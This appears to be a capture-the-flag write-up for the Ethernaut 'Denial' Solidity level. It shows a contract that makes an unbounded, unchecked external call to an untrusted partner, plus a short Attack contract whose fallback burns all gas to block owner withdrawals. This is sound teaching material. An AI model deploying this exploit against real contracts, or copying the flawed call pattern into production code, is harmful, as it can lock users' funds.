<div align="center">

# Denial

</div>



**Denial (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

</details>

---------

**Approach and Exploit Method Including Code :** 

1. **Understand the contract**

   - `Denial` allows a `partner` to withdraw 1% of the contract balance alongside the `owner`.  
   - `withdraw()` calls the `partner` using a low-level `.call{value: ...}("")` **without gas limit checks**, then transfers the owner's share.  
   - **Key idea:** A malicious partner can **consume all gas or revert indefinitely**, preventing the owner’s transfer from completing and effectively **locking the owner out**.


2. **Vulnerability Highlight (key part)**


```solidity
function withdraw() public {
    uint256 amountToSend = address(this).balance / 100;
    partner.call{value: amountToSend}(""); // untrusted call — partner can revert or use all gas
    payable(owner).transfer(amountToSend);
}
```


## Exploit Code

```Solidity

contract Attack {
    constructor (Denial target){
        target.setWithdrawPartner(address(this));
    }
    fallback() external payable { 
        assembly {
            invalid()
        }
    }
}


```

---


